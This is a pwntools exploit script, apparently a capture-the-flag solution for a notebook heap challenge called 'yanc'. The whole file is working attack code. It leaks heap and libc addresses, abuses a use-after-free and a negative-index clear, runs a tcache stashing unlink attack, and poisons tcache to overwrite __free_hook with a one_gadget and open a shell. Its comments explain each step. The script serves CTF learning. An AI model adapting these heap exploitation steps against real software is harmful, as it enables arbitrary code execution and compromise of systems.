#!/usr/bin/env python3
from pwn import *

exe = ELF("./yanc")

libc = exe.libc

HOST, PORT = "pwn.chal.ctf.gdgalgiers.com", 1406

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
c
'''
CHECKING = True

NUM_NOTES = 0x10
MIN_NOTE_SIZE = 0x70
MAX_NOTE_SIZE = 0xd0
TITLE_SIZE = 0x8
# main_arena + 400
LIBC_OFFSET = libc.sym.__malloc_hook + 0x10 + 400
LIBC_LEAK_BYTE = LIBC_OFFSET & 0xff
CHUNK_SIZE = 0xa0
HEAP_OFFSET = 0x650
HEAP_LEAK_BYTE = HEAP_OFFSET & 0xff
TCACHE_COUNT_FIELD_OFFSET = -0x50
FAKE_CHUNK_OFFSET = 0xbc0
ONE_GADGETS_OFFSETS = [
    0xe6c7e,
    0xe6c81,
    0xe6c84,
]
ONE_GADGET_OFFSET = ONE_GADGETS_OFFSETS[1]

def main():
    global io
    io = conn()

    # account for ID and title
    c = lambda size: size - 0x10

    # Stage 1: Leaking heap and libc addresses with some heap feng shui

    for i in range(9):
        add(i, c(CHUNK_SIZE - 0x8), f"{i}".encode() * 8, b"A" * c(CHUNK_SIZE - 0x8))

    # top chunk separator
    add(NUM_NOTES - 1, c(CHUNK_SIZE - 0x8), b"top", b"top")

    for i in range(7):
        delete(i)

    delete(8)
    delete(7)

    for i in range(7):
        add(i, c(CHUNK_SIZE - 0x8), f"{i}".encode() * 8, b"B" * c(CHUNK_SIZE - 0x8))

    _id, _, _ = show(0)
    heap_leak = pack(_id >> 8 << 8 | HEAP_LEAK_BYTE)
    heap_base = leak(heap_leak, HEAP_OFFSET, "heap", True)

    add(7, c(CHUNK_SIZE - 0x8), bytes([LIBC_LEAK_BYTE]), b"C" * c(CHUNK_SIZE - 0x10))

    _, libc_leak, _ = show(7)
    libc.address = leak(libc_leak, LIBC_OFFSET, "libc", True)

    # empty unsorted bin
    add(8, c(CHUNK_SIZE - 0x8), b"8" * 8, b"D" * c(CHUNK_SIZE - 0x8))

    # Stage 2: tcache stashing unlink attack
    # (We already have 9 malloced chunks of size 0xa0)

    # Let's malloc 6 more chunks
    # The 12th chunk (id = 12), will serve as a basis
    # to construct a fake chunk later, that is why
    # we need to set its content carefully
    VICTIM_CHUNK_ID = 12
    fake_chunk = heap_base + FAKE_CHUNK_OFFSET
    chunk_content = flat(
        b"X" * (CHUNK_SIZE - 8 - 0x10 - 0x8 * 5),
        0x0, # prev_size
        CHUNK_SIZE | 0x1, # size
        0x0, # fd
        fake_chunk + 0x10, # bk (bk points to &fd)
        0x0,
    )
    for i in range(9, 9 + 6):
        if i == VICTIM_CHUNK_ID:
            content = chunk_content
        else:
            content = f"{i}".encode()
        add(i, c(CHUNK_SIZE - 0x8), f"{i}".encode(), content)

    # Put 7 chunks in tcache
    for i in range(0, 13, 2):
        delete(i)

    # Put 8 chunks in unsorted bin
    for i in range(1, 14, 2):
        delete(i)

    # malloc a chunk larger than 0xa0 to put unsorted bin chunks into small bins
    add(3, c(CHUNK_SIZE + 0x8), b"3" * 8, b"E" * c(CHUNK_SIZE + 0x8))

    # trigger vulnerability: UAF that lets you edit victim->bck
    fake_chunk = heap_base + FAKE_CHUNK_OFFSET
    title = flat(
        fake_chunk,
    )
    edit_title(13, title)

    # We don't have calloc, so we use the second vulnerability,
    # which lies in clear_note function.
    # This function allows choosing negative indexes when
    # clearing notes (setting the pointer to NULL).
    # We use it to index the tcache count field (for chunks of size 0xa0),
    # that way it seems as if there are no tcache chunks for that size when
    # performing the next allocation.
    clear(TCACHE_COUNT_FIELD_OFFSET)

    # Trigger the attack

    # This allocation will fetch from the small bin since we're
    # tricking malloc into thinking there are no tcache chunks.
    # Additionally, the chunks in the small bin will be stashed
    # in tcache, including the fake chunk.
    add(4, c(CHUNK_SIZE - 0x8), b"4", b"I")

    # Next allocation returns our fake chunk from tcache,
    # We craft its content so we can overwrite
    # the FD pointer of an actual tcache chunk to achieve
    # tcache poisoning.
    # The fake FD is &__free_hook minus 0x10 to account
    # for ID and title
    fake_fd = libc.sym.__free_hook - 0x10
    content = flat(
        0x0,
        CHUNK_SIZE | 0x1,
        fake_fd
    )
    add(5, c(CHUNK_SIZE - 0x8), b"5", content)

    # dummy chunk
    add(6, c(CHUNK_SIZE - 0x8), b"6", b"6")

    content = pack(libc.address + ONE_GADGET_OFFSET)
    add(0, c(CHUNK_SIZE - 0x8), b"\0", content)

    # Freeing ID 0 perfectly sets RDX to 0x0,
    # which satisfies one of the one gadget constraints
    delete(0)

    io.interactive()

def add(idx, size, title, content):
    check(0 <= idx <= NUM_NOTES)
    check(MIN_NOTE_SIZE <= size <= MAX_NOTE_SIZE)
    check(1 <= len(title) <= TITLE_SIZE)
    check(1 <= len(content) <= size)
    io.recvuntil(b"Choice: ")
    io.sendline(b"1")
    io.recvuntil(b"Index: ")
    io.sendline(f"{idx}".encode())
    io.recvuntil(b"Size: ")
    io.sendline(f"{size}".encode())
    io.recvuntil(b"Title: ")
    io.send(title)
    io.recvuntil(b"Content: ")
    io.send(content)

def show(idx):
    check(0 <= idx <= NUM_NOTES)
    io.recvuntil(b"Choice: ")
    io.sendline(b"2")
    io.recvuntil(b"Index: ")
    io.sendline(f"{idx}".encode())
    io.recvuntil(b"ID: ")
    _id = int(io.recvuntil(b"\nTitle: ", drop=True))
    title = io.recvuntil(b"\nContent: ", drop=True)
    content = io.recvuntil(b"\nWelcome to yet another notebook challenge!\n", drop=True)
    return _id, title, content

def edit_title(idx, title):
    check(0 <= idx <= NUM_NOTES)
    check(1 <= len(title) <= TITLE_SIZE)
    io.recvuntil(b"Choice: ")
    io.sendline(b"3")
    io.recvuntil(b"Index: ")
    io.sendline(f"{idx}".encode())
    io.recvuntil(b"Title: ")
    io.send(title)

def delete(idx):
    check(0 <= idx <= NUM_NOTES)
    io.recvuntil(b"Choice: ")
    io.sendline(b"4")
    io.recvuntil(b"Index: ")
    io.sendline(f"{idx}".encode())

def clear(idx):
    check(idx <= NUM_NOTES)
    io.recvuntil(b"Choice: ")
    io.sendline(b"5")
    io.recvuntil(b"Index: ")
    io.sendline(f"{idx}".encode())

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
